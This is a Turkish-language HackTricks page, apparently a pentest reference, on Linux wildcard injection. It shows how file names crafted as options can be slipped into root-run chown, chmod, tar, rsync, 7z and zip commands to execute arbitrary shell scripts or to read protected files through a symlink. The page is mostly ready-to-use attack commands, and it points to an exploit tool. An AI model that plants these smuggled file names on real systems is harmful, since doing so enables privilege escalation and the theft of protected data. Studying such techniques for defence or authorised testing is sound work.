<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>


## chown, chmod

**Diğer dosyalar için hangi dosya sahibi ve izinlerini kopyalamak istediğinizi belirtebilirsiniz**
```bash
touch "--reference=/my/own/path/filename"
```
Bu, [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(kombine saldırı)_ kullanarak sömürülebilir.\
Daha fazla bilgi için [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Keyfi komutları çalıştır:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Bu, [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) kullanarak sömürülebilir _(tar saldırısı)_\
Daha fazla bilgi için [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Keyfi komutları çalıştır:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Bu, [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) kullanarak sömürülebilir. _(_rsync _attack)_\
Daha fazla bilgi için [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

**7z**'de, `*`'den önce `--` kullanarak (not: `--`, takip eden girişin parametre olarak işleme alınamayacağı anlamına gelir, bu durumda sadece dosya yolları) bir dosyayı okumak için keyfi bir hata oluşturabilirsiniz. Bu durumda root tarafından aşağıdaki gibi bir komut çalıştırılıyorsa:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
Ve bu yürütülen klasörde dosyalar oluşturabilirsiniz, `@root.txt` dosyasını ve `root.txt` dosyasını oluşturabilirsiniz, bu dosya istediğiniz dosyanın bir **sembolik bağlantısı** olabilir:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Ardından, **7z** çalıştırıldığında, `root.txt`'yi sıkıştırması gereken dosyaların listesini içeren bir dosya olarak işleyecektir (`@root.txt`'nin varlığı bunu gösterir) ve 7z `root.txt`'yi okuduğunda `/file/you/want/to/read`'i okuyacak ve **bu dosyanın içeriği bir dosya listesi olmadığı için bir hata fırlatacaktır** ve içeriği gösterecektir.

_Daha fazla bilgi için HackTheBox'tan CTF kutusu Write-up'larında._ 

## Zip

**Keyfi komutları çalıştırma:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimizden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>
